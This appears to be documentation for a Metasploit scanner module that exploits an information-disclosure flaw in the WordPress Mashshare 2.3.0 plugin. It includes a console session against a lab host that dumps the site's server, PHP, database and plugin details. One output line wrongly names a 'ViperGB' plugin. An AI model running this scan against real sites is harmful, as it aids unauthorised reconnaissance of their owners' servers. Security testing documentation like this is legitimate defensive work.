#### Add WordPress Plugin Mashshare Information Disclosure Vulnerability.

  Application: WordPress Plugin 'Mashshare' 2.3.0
  Homepage: https://wordpress.org/plugins/mashshare/
  Source Code: https://downloads.wordpress.org/plugin/mashsharer.2.3.0.zip
  Active Installs: 20,000+
  References: https://wpvulndb.com/vulnerabilities/7936

#### Vulnerable packages*
        
  2.3.0
  
#### Usage:

##### Linux (Ubuntu 14.04.2 LTS):
```
msf > use auxiliary/scanner/http/wp_mashshare_info_disclosure 
msf auxiliary(wp_mashshare_info_disclosure) > info

       Name: WordPress Mashshare Plugin Info Disclosure
     Module: auxiliary/scanner/http/wp_mashshare_info_disclosure
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2015-04-25

Provided by:
  James Hooker
  Roberto Soares Espreto <robertoespreto@gmail.com>

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      80               yes       The target port
  TARGETURI  /                yes       The base path to the wordpress application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host

Description:
  This module attempts to exploit a information disclosure in 
  Mashshare for WordPress, version 2.3.0 and likely prior in order if 
  the instance is vulnerable.

References:
  http://www.osvdb.org/120988
  https://wpvulndb.com/vulnerabilities/7936
  https://research.g0blin.co.uk/g0blin-00045/

msf auxiliary(wp_mashshare_info_disclosure) > show options 

Module options (auxiliary/scanner/http/wp_mashshare_info_disclosure):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads
   VHOST                       no        HTTP server virtual host

msf auxiliary(wp_mashshare_info_disclosure) > set RHOSTS 192.168.1.38
RHOSTS => 192.168.1.38
msf auxiliary(wp_mashshare_info_disclosure) > check
[*] 192.168.1.38:80 - The target appears to be vulnerable.
[*] Checked 1 of 1 hosts (100% complete)
msf auxiliary(wp_mashshare_info_disclosure) > run

[+] 192.168.1.38:80 - Vulnerable to Information Disclosure the "ViperGB 1.3.10" plugin for WordPress
[+] Save in: /home/espreto/.msf4/loot/20150513005815_default_192.168.1.38_wp_mashshare_018552.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wp_mashshare_info_disclosure) > set VERBOSE true
VERBOSE => true
msf auxiliary(wp_mashshare_info_disclosure) > run

[+] 192.168.1.38:80 - Vulnerable to Information Disclosure the "ViperGB 1.3.10" plugin for WordPress
[+] Information Disclosure:   <form action="http://127.0.0.1/wp-admin/admin.php?page=mashsb-tools&#038;tab=system_info" method="post" dir="ltr">
    <textarea readonly="readonly" onclick="this.focus(); this.select()" id="system-info-textarea" name="mashsb-sysinfo" title="To copy the system info, click below then press Ctrl + C (PC) or Cmd + C (Mac).">### Begin System Info ###

-- Site Info

Site URL:                 http://127.0.0.1
Home URL:                 http://127.0.0.1
Multisite:                No

-- User Browser

Platform:                 Windows 
Browser Name:             Internet Explorer  
Browser Version:          6.0 
User Agent String:        Mozilla/4.0 (compatible; MSIE 6. 
        0; Windows NT 5.1)
                          
-- WordPress Configuration

Version:                  4.2.2
Language:                 en_US
Permalink Structure:      /%year%/%monthnum%/%day%/%postname%/
Active Theme:             Twenty Fifteen 1.2
Show On Front:            posts
Remote Post:              wp_remote_post() works
Table Prefix:             Length: 3   Status: Acceptable
WP_DEBUG:                 Disabled
Memory Limit:             40M
Registered Post Stati:    publish, future, draft, pending, private, trash, auto-draft, inherit

-- MASHSB Configuration

Version:                  2.3.0
Upgraded From:            None

-- WordPress Active Plugins

Mashshare Share Buttons: 2.3.0

-- WordPress Inactive Plugins

Akismet: 3.1.1
Hello Dolly: 1.6

-- Webserver Configuration

PHP Version:              5.5.9-1ubuntu4.9
MySQL Version:            5.5.43
Webserver Info:           Apache/2.4.7 (Ubuntu)

-- PHP Configuration

Safe Mode:                Disabled
Memory Limit:             128M
Upload Max Size:          2M
Post Max Size:            8M
Upload Max Filesize:      2M
Time Limit:               30
Max Input Vars:           1000
Display Errors:           N/A

-- PHP Extensions

cURL:                     Not Supported
fsockopen:                Supported
SOAP Client:              Installed
Suhosin:                  Not Installed

### End System Info ###</textarea>
    <p class="submit">
      <input type="hidden" name="mashsb-action" value="download_sysinfo" />
      <input type="submit" name="mashsb-download-sysinfo" id="mashsb-download-sysinfo" class="button button-primary" value="Download System Info File"  />    </p>
  </form>
0
[+] Save in: /home/espreto/.msf4/loot/20150513005828_default_192.168.1.38_wp_mashshare_980977.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wp_mashshare_info_disclosure) >
```
